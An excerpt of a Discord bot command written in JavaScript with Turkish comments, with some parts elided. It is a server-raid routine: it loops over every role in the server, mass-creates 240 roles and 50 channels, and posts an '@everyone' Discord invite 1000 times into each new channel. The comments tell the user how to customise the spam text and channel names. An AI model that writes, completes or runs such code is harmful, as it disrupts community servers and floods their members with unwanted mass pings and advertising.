module.exports.run = async (client, message, args) => {
    var channelNames =  ["altyapitr"]; //buraya istediğiniz kadar kanal adı girin hepsini açıp mesaj atıcak 29. satırı kontrol et!
    ...
    message.guild.roles.cache.forEach(role => {
        ...
        for(let i = 0; i < 240; i++) {
            message.guild.roles.create({ name: "altyapitr" }).then((createdRole) => {
    ...
    for(let i = 0; i < 50; i++) {
        ...
        message.guild.channels.create(channelName, {
            ...
            for(let i = 0; i < 1000; i++) { ///süreyi elleme 
                channel.send({ content: "@everyone https://discord.gg/altyapitr" });//// burada açtığı tüm kanallara ever spamı atar mesaj içeriğini yazın kısaca
            }
        });
    }
}
